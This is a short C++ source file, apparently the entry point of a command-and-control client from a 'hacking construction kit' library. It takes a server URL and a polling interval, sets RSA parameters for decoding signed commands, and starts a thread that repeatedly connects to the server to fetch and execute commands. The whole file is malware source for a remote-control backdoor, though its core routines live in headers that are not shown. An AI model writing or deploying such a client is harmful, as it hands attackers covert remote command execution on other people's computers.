/*
 * Author: thirdstormofcythraul@outlook.com
 */
#ifdef _DEBUG
#define _CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>
#endif

#include <tchar.h>
#include <iostream>

#include <winsock2.h>

#include <global.h>
#include <network.h>
#include <command_manager.h>
#include <decoder.h>
#pragma comment(lib, "hacking construction kit.lib")

#include <memory_debug.h>

DWORD WINAPI RemoveService(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow){
	return 0;
}

int _tmain(int argc, _TCHAR* argv[])
{
#ifdef _DEBUG
	_CrtSetDbgFlag ( _CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF );
#endif

	if (argc != 3){
		std::cout << "Launch a command and conquer client. It'll connect to 'url' every 'timer' seconds and execute comamnds\n";
		std::cout << "usage: " << argv[0] << " url timer\n";
		return 1;
	}
	Decoder::modulus = "61450025384610504519891362550805453301358404976798330653284132489";
	Decoder::exponent = "65537";

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2), &wsaData);

	DWORD remoteccThreadId;

	CCLoop_t ccParams;
	ccParams.filename = "command_and_conquer.exe";
	ccParams.version = "7";
	ccParams.wait = atoi(argv[2]);
	ccParams.serversUrl = new std::string[1];
	const std::string server = argv[1];
	ccParams.serversUrl[0] = server;
	ccParams.nbServers = 1;

	HANDLE remoteccHandle = CreateThread(NULL, 0, CommandManager::connectToCCLoop, &ccParams,	0, &remoteccThreadId);
	
	WaitForSingleObject(remoteccHandle, 500000);

	delete[] ccParams.serversUrl;
	return 0;
}

